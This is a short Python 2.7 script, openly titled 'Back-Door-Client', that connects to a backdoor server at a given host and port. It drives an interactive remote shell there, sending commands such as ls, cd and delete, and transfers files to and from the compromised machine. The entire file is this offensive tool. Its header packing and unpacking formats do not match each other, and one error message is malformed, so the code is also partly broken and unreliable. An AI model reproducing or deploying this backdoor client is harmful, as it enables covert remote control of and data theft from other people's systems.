#!/usr/bin/python2.7
# -*- coding:utf-8 -*-

__doc__ = """
# Name    :  Back-Door-Client
# Author  :  Shinukami
# Date    :  2016-3-12
# Version :  0.0.3
"""

import os, socket, sys, struct

class BackDoorClient(object):

    def __init__(self):
        self.host = sys.argv[1]
        self.port = int(sys.argv[2])
        self.BUFSIZE = 1024

        self.FILEINFO_SIZE=struct.calcsize('128s1s1I')
        self.DATAINFO_SIZE=struct.calcsize('1024s')

        self.I = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.Shell_command = ["ls","cd","pwd","delete","help"]


    def Upload(self,filename):
        f = open(filename,'rb')
        size = os.stat(filename).st_size
        fhead = struct.pack('128s1s1I',filename,'|',size,0,0)

        self.I.send(fhead)
        try:
            while 1:
                Upload_Data = f.read(self.BUFSIZE)
                if not Upload_Data:break
                sent = self.I.send(Upload_Data)
            f.close()
        except Exception as error_code:
            print "Exception occur : %s"%(error_code, filename)

    def Download(self,filename):
        fhead = self.I.recv(self.FILEINFO_SIZE)
        filenameS,temp,filesize,t1,t2=struct.unpack('128s1s3I',fhead)
        restsize = filesize
        f = open(filename.split("/")[-1],"wb")
        data = ""
        while True:
            if restsize > self.BUFSIZE:
                Download_Data = self.I.recv(self.BUFSIZE)
            else:
                Download_Data = self.I.recv(restsize)
            if not Download_Data:break
            data += Download_Data
            restsize = restsize-len(Download_Data)
            if restsize == 0:break
        f.write(data)
        f.close()

    def BackShell(self):
        while 1:
            Data_recv = self.I.recv(self.DATAINFO_SIZE)

            Data_recv = struct.unpack('1024s',Data_recv)[0].strip('\00')
            print Data_recv,
            CMD = raw_input("""$ """)
            send_pac = struct.pack('1024s',CMD)
            self.I.send(send_pac)
            CMD = CMD.split(" ")
            if CMD[0] == "download":
                self.Download(CMD[1])
            elif CMD[0] == "upload":
                self.Upload(CMD[1])
            elif CMD[0] in self.Shell_command:
                Data_recv = self.I.recv(self.DATAINFO_SIZE)
                Data_recv = struct.unpack('1024s',Data_recv)[0].strip('\00')
                print Data_recv

    def Start(self):
        try:
            self.I.connect((self.host,self.port))
        except Exception as e:
            print "Error : %s"%(e)
            self.I.close()
            sys.exit()
        try:
            self.BackShell()
        except Exception as e:
            print "Error : %s"%(e)
        finally:
            self.I.close()

if __name__ == "__main__":
    Client = BackDoorClient()
    Client.Start()
